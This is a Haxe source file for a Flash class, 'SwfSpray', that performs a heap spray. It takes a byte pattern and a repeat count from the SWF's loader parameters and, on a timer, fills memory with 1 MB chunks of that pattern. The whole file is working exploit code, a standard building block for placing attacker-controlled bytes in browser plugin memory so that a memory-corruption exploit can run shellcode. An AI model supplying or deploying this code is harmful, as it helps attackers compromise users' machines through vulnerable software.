class SwfSpray
{
 static var Memory = new Array();
 static var chunk_size:UInt = 0x100000;
 static var chunk_num;
 static var minichunk;
 static var t;

 static function main()
 {
  minichunk = flash.Lib.current.loaderInfo.parameters.minichunk;
  chunk_num = Std.parseInt(flash.Lib.current.loaderInfo.parameters.N);
  t = new haxe.Timer(7);
  t.run = doSpray;
 }

 static function doSpray()
 {
  var chunk = new flash.utils.ByteArray();

  while(chunk.length < chunk_size)
   {
      chunk.writeMultiByte(minichunk, 'us-ascii');
   }

   for(i in 0...chunk_num)
   {
     Memory.push(chunk);
   }

   chunk_num--;
   if(chunk_num == 0)
   {
     t.stop();
   }
 }
}
